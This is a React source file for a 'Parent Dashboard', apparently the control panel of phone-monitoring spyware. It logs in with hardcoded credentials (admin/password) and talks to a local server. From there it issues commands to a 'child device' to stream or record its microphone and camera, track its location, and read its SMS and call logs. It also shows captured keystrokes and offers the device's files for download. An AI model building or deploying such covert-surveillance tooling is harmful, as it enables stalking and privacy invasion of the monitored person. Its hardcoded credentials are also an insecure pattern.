import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import './App.css';

function App() {
    const [files, setFiles] = useState([]);
    const [keylogs, setKeylogs] = useState([]);
    const [locations, setLocations] = useState([]);
    const [smsLogs, setSmsLogs] = useState([]);
    const [callLogs, setCallLogs] = useState([]);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [isLoggedIn, setIsLoggedIn] = useState(false);
    const videoRef = useRef(null);
    const wsRef = useRef(null);
    const peerConnectionRef = useRef(null);

    useEffect(() => {
        if (isLoggedIn) {
            fetchStorage();
            setupWebSocket();
            setupWebRTC();
        }
        return () => {
            if (wsRef.current) {
                wsRef.current.close();
            }
            if (peerConnectionRef.current) {
                peerConnectionRef.current.close();
            }
        };
    }, [isLoggedIn]);

    const fetchStorage = async () => {
        try {
            const response = await axios.get('http://192.168.0.102:8080/api/storage');
            setFiles(response.data);
        } catch (error) {
            console.error('Error fetching storage:', error);
        }
    };

    const login = () => {
        if (username === 'admin' && password === 'password') {
            setIsLoggedIn(true);
        } else {
            alert('Invalid credentials');
        }
    };

    const sendCommand = async (command) => {
        try {
            await axios.post('http://192.168.0.102:8080/api/command', { command });
            alert(`Command sent: ${command}`);
        } catch (error) {
            console.error('Error sending command:', error);
            alert('Failed to send command');
        }
    };

    const setupWebSocket = () => {
        wsRef.current = new WebSocket('ws://192.168.0.102:8080');
        wsRef.current.onopen = () => {
            wsRef.current.send(JSON.stringify({ clientType: 'parent' }));
            console.log('WebSocket connected');
        };

        wsRef.current.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                console.log('WebSocket message:', data);

                // Handle WebRTC signaling
                if (data.type === 'offer') {
                    handleWebRTCOffer(data);
                } else if (data.type === 'candidate') {
                    handleWebRTCCandidate(data);
                } else if (data.type === 'child_connected') {
                    alert(`Child device connected: ${data.deviceId}`);
                } else if (data.dataType) {
                    // Handle logs and files
                    switch (data.dataType) {
                        case 'keylog':
                            setKeylogs(prev => [...prev, { ...data, id: Date.now() }]);
                            break;
                        case 'location':
                            setLocations(prev => [...prev, { ...data, id: Date.now() }]);
                            break;
                        case 'sms':
                            setSmsLogs(prev => [...prev, { ...data, id: Date.now() }]);
                            break;
                        case 'call_log':
                            setCallLogs(prev => [...prev, { ...data, id: Date.now() }]);
                            break;
                        case 'audio':
                        case 'video':
                        case 'image':
                            setFiles(prev => [...prev, {
                                name: `${data.dataType}_${data.timestamp}${data.dataType === 'audio' ? '.opus' : data.dataType === 'video' ? '.mp4' : '.jpg'}`,
                                path: data.file || `/storage/${data.dataType}_${data.timestamp}${data.dataType === 'audio' ? '.opus' : data.dataType === 'video' ? '.mp4' : '.jpg'}`,
                                type: data.dataType,
                                size: data.data ? (data.data.length * 0.75 / 1024).toFixed(2) : 0 // Approximate size from base64
                            }]);
                            break;
                        default:
                            console.warn('Unknown dataType:', data.dataType);
                    }
                }
            } catch (error) {
                console.error('Error processing WebSocket message:', error);
            }
        };

        wsRef.current.onclose = () => {
            console.log('WebSocket closed');
        };

        wsRef.current.onerror = (error) => {
            console.error('WebSocket error:', error);
        };
    };

    const setupWebRTC = () => {
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        peerConnectionRef.current = pc;

        pc.ontrack = (event) => {
            if (videoRef.current) {
                videoRef.current.srcObject = event.streams[0];
                console.log('WebRTC track added');
            }
        };

        pc.onicecandidate = (event) => {
            if (event.candidate && wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
                wsRef.current.send(JSON.stringify({
                    type: 'candidate',
                    id: event.candidate.sdpMid,
                    label: event.candidate.sdpMLineIndex,
                    candidate: event.candidate.candidate
                }));
                console.log('Sent ICE candidate');
            }
        };

        pc.oniceconnectionstatechange = () => {
            console.log('ICE connection state:', pc.iceConnectionState);
        };
    };

    const handleWebRTCOffer = async (data) => {
        const pc = peerConnectionRef.current;
        try {
            await pc.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: data.sdp }));
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);
            if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
                wsRef.current.send(JSON.stringify({ type: 'answer', sdp: answer.sdp }));
                console.log('Sent WebRTC answer');
            }
        } catch (error) {
            console.error('Error handling WebRTC offer:', error);
        }
    };

    const handleWebRTCCandidate = async (data) => {
        const pc = peerConnectionRef.current;
        try {
            await pc.addIceCandidate(new RTCIceCandidate({
                sdpMid: data.id,
                sdpMLineIndex: data.label,
                candidate: data.candidate
            }));
            console.log('Added ICE candidate');
        } catch (error) {
            console.error('Error adding ICE candidate:', error);
        }
    };

    return (
        <div className="App">
            {!isLoggedIn ? (
                <div className="login">
                    <h1>Parent Dashboard Login</h1>
                    <input
                        type="text"
                        placeholder="Username"
                        value={username}
                        onChange={e => setUsername(e.target.value)}
                    />
                    <input
                        type="password"
                        placeholder="Password"
                        value={password}
                        onChange={e => setPassword(e.target.value)}
                    />
                    <button onClick={login}>Login</button>
                </div>
            ) : (
                <div>
                    <h1>Parent Dashboard</h1>
                    <div className="commands">
                        <h2>Control Panel</h2>
                        <button onClick={() => sendCommand('start_audio')}>Start Audio Stream</button>
                        <button onClick={() => sendCommand('stop_audio')}>Stop Audio Stream</button>
                        <button onClick={() => sendCommand('record_audio')}>Record Audio</button>
                        <button onClick={() => sendCommand('start_camera')}>Start Camera Stream</button>
                        <button onClick={() => sendCommand('stop_camera')}>Stop Camera Stream</button>
                        <button onClick={() => sendCommand('record_camera')}>Record Camera</button>
                        <button onClick={() => sendCommand('start_location')}>Start Location</button>
                        <button onClick={() => sendCommand('read_sms')}>Read SMS</button>
                        <button onClick={() => sendCommand('read_call_log')}>Read Call Log</button>
                    </div>
                    <div className="logs">
                        <h2>Keylogs</h2>
                        <table>
                            <thead>
                                <tr>
                                    <th>Data</th>
                                    <th>Timestamp</th>
                                </tr>
                            </thead>
                            <tbody>
                                {keylogs.map(log => (
                                    <tr key={log.id}>
                                        <td>{log.data}</td>
                                        <td>{new Date(log.timestamp).toLocaleString()}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                        <h2>Location Logs</h2>
                        <table>
                            <thead>
                                <tr>
                                    <th>Data</th>
                                    <th>Timestamp</th>
                                </tr>
                            </thead>
                            <tbody>
                                {locations.map(log => (
                                    <tr key={log.id}>
                                        <td>{log.data}</td>
                                        <td>{new Date(log.timestamp).toLocaleString()}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                        <h2>SMS Logs</h2>
                        <table>
                            <thead>
                                <tr>
                                    <th>Data</th>
                                    <th>Timestamp</th>
                                </tr>
                            </thead>
                            <tbody>
                                {smsLogs.map(log => (
                                    <tr key={log.id}>
                                        <td>{log.data}</td>
                                        <td>{new Date(log.timestamp).toLocaleString()}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                        <h2>Call Logs</h2>
                        <table>
                            <thead>
                                <tr>
                                    <th>Data</th>
                                    <th>Timestamp</th>
                                </tr>
                            </thead>
                            <tbody>
                                {callLogs.map(log => (
                                    <tr key={log.id}>
                                        <td>{log.data}</td>
                                        <td>{new Date(log.timestamp).toLocaleString()}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                    <div className="storage">
                        <h2>Child Device Storage</h2>
                        <table>
                            <thead>
                                <tr>
                                    <th>File Name</th>
                                    <th>Type</th>
                                    <th>Size (KB)</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody>
                                {files.map(file => (
                                    <tr key={file.name}>
                                        <td>{file.name}</td>
                                        <td>{file.type}</td>
                                        <td>{file.size}</td>
                                        <td>
                                            <a href={`http://192.168.0.102:8080${file.path}`} download>Download</a>
                                        </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                    <div className="live-stream">
                        <h2>Live Stream</h2>
                        <video ref={videoRef} autoPlay playsInline muted style={{ width: '100%', maxWidth: '640px' }} />
                    </div>
                </div>
            )}
        </div>
    );
}

export default App;
